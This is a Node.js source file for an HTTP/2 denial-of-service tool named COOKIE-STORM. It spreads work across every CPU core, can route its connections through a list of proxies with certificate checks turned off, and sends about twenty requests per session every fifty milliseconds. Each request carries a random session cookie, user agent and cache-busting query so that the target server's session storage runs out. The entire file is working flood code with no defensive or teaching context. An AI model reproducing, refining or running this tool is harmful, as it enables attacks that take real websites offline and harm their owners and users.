// R10-8: COOKIE-STORM - Session Cookie Flood
// Focus: Server-side session storage exhaustion
// Technique: Unique cookies per request

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-8] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-8] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-8] Loaded ${userAgents.length} user agents`);
} catch (e) {}

function generateSessionCookie() {
    const sessions = [
        `PHPSESSID=${crypto.randomBytes(16).toString('hex')}`,
        `JSESSIONID=${crypto.randomBytes(16).toString('hex')}`,
        `ASP.NET_SessionId=${crypto.randomBytes(16).toString('hex')}`,
        `session=${crypto.randomBytes(16).toString('hex')}`,
        `sid=${crypto.randomBytes(8).toString('hex')}`
    ];
    
    return sessions[Math.floor(Math.random() * sessions.length)];
}

if (cluster.isMaster) {
    console.log(`[R10-8] COOKIE-STORM launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    const parsed = new URL(target);
    
    let requestCount = 0;
    const sessions = [];
    
    // Create session pool with proxies
    (async () => {
        for (let i = 0; i < 200; i++) {
            try {
                let session;
                
                if (proxies.length > 0) {
                    const proxy = proxies[i % proxies.length];
                    const [proxyHost, proxyPort] = proxy.split(':');
                    
                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                        socket.write(`CONNECT ${parsed.hostname}:443 HTTP/1.1\r\nHost: ${parsed.hostname}:443\r\n\r\n`);
                        
                        socket.once('data', () => {
                            const tlsSocket = tls.connect({
                                socket: socket,
                                servername: parsed.hostname,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2']
                            }, () => {
                                const session = http2.connect(parsed.origin, {
                                    createConnection: () => tlsSocket
                                });
                                session.on('error', () => {});
                                sessions.push(session);
                            });
                        });
                    });
                } else {
                    session = http2.connect(parsed.origin, { rejectUnauthorized: false });
                    session.on('error', () => {});
                    sessions.push(session);
                }
            } catch (e) {}
            
            await new Promise(r => setTimeout(r, 50));
        }
    })();
    
    setTimeout(() => {
        const interval = setInterval(() => {
            for (let s = 0; s < sessions.length; s++) {
                const session = sessions[s];
                if (!session || session.destroyed) continue;
                
                for (let i = 0; i < 20; i++) {
                    try {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        const headers = {
                            ':path': parsed.pathname + '?' + Math.random(),
                            'user-agent': ua,
                            'cookie': generateSessionCookie(),
                            'cache-control': 'no-cache'
                        };
                        
                        const req = session.request(headers);
                        req.on('response', () => req.close());
                        req.on('error', () => {});
                        req.end();
                        
                        requestCount++;
                    } catch (e) {}
                }
            }
        }, 50);
        
        setInterval(() => {
            console.log(`[R10-8] RPS: ${requestCount}`);
            requestCount = 0;
        }, 1000);
        
        setTimeout(() => {
            clearInterval(interval);
            sessions.forEach(s => {
                try { s.destroy(); } catch (e) {}
            });
            process.exit(0);
        }, time * 1000);
    }, 5000);
}